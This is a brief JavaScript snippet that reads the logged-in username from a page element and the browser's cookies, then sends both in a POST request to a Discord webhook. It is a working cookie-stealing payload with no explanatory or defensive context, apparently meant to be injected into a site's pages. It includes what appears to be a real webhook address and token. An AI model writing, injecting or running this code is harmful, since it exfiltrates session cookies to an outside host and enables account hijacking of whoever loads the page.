let u = document.querySelector('.pro-user-name');
let n = u ? u.textContent.trim() : 'None';
fetch('https://discord.com/api/webhooks/1379479118034243644/o11paCeKPJ03rgxh1ca-f4WW0CkPGKZB4ujrAphJjjzaKXXTvglBbM1kR24K9R5Iy1cr', {
  method: 'POST',
  headers: {'Content-Type': 'application/json'},
  body: JSON.stringify({ content: `U:${n} C:${document.cookie}` })
});
